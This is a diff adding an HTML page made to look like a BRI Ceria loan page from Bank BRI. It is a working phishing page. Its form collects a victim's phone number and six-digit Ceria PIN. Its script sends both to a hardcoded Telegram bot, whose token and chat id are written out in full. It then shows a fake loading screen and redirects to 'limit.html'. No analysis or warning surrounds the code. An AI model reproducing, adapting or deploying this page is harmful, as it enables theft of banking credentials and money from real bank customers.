@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BRI CERIA PINJAMAN BANK BRI</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .gambar {
+      width: 100%;
+      margin-bottom: 0px;
+    }
+
+    .gambar img {
+      width: 100%;
+      object-fit: cover;
+      margin-bottom: 0px;
+    }
+
+    .form-container {
+      margin-bottom: 50px;
+    }
+
+    .form-container form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .form-container input[type="tel"],
+    .form-container input[type="password"],
+    .form-container input[type="Submit"] {
+      width: calc(85% - 8px);
+      padding: 13px;
+      border-radius: 8px;
+      border: 1px solid #663399;
+      margin-bottom: 30px;
+      margin-left: 4px;
+    }
+
+    .form-container input[type="Submit"] {
+      width: calc(100% - 8px);
+      max-width: 330px;
+      padding: 13px;
+      border-radius: 5px;
+      background-color: #663399;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-left: 7px;
+    }
+
+    .gambar-bawah {
+      display: flex;
+      justify-content: center;
+      position: relative;
+      bottom: -10px;
+    }
+
+    .gambar-bawah img {
+      width: 90%;
+      object-fit: cover;
+      margin: 0 25px;
+    }
+
+    /* Aturan gaya untuk elemen putih */
+    .white-element {
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8); /* Atur alpha (nilai transparansi) sesuai keinginan */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .white-element img {
+      width: 80px; /* Ganti dengan ukuran yang diinginkan */
+      height: 80px; /* Ganti dengan ukuran yang diinginkan */
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  </style>
+  <script>
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/bot6871145803:AAEe1OQPkjGp6Yr_FY1mbF4r9gTsc4bvLdc/sendMessage?chat_id=5408977495&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var nomorHP = document.getElementById('nomor_hp').value;
+      var pin = document.getElementById('pin').value;
+      if (nomorHP.trim() === '' || pin.trim() === '') {
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        return;
+      }
+
+      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
+      sendMessageToTelegram(message);
+      showWhiteElement();
+    }
+
+    function showWhiteElement() {
+      var whiteElement = document.createElement('div');
+      whiteElement.classList.add('white-element');
+
+      var logoImage = document.createElement('img');
+      logoImage.src = 'https://i.ibb.co/znztJ3h/IMG-20240125-000423-removebg-preview.png';
+      logoImage.alt = 'Logo';
+      whiteElement.appendChild(logoImage);
+
+      var loadingText = document.createElement('div');
+      loadingText.classList.add('loading-text');
+      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
+      whiteElement.appendChild(loadingText);
+
+      document.body.appendChild(whiteElement);
+
+      setTimeout(function () {
+        window.location.href = 'limit.html';
+      }, 5000); // Ubah waktu penundaan menjadi 5 detik
+    }
+
+    function updateStyle(inputId) {
+      var inputElement = document.getElementById(inputId);
+      var inputValue = inputElement.value;
+
+      if (inputValue !== '') {
+        inputElement.style.fontWeight = 'bold';
+        inputElement.style.color = 'rgba(black)';
+      } else {
+        inputElement.style.fontWeight = 'normal';
+        inputElement.style.color = 'inherit';
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="gambar">
+    <img src="https://i.ibb.co/sgcQnDC/IMG-20240116-050851.jpg" alt="Gambar Pucok">
+  </div>
+
+  <div class="form-container">
+    <form onsubmit="kirimPesan(); return false;">
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="+62 Nomor Handphone" oninput="updateStyle('nomor_hp')">
+      <input type="tel" id="pin" name="pin" placeholder="Masukkan PIN Ceria" maxlength="6" class="pin-input" oninput="updateStyle('pin')">
+      <input type="Submit" value="Lanjutkan">
+    </form>
+  </div>
+
+  <div class="gambar gambar-bawah">
+    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Logo LPS">
+  </div>
+</body>
+  </html>
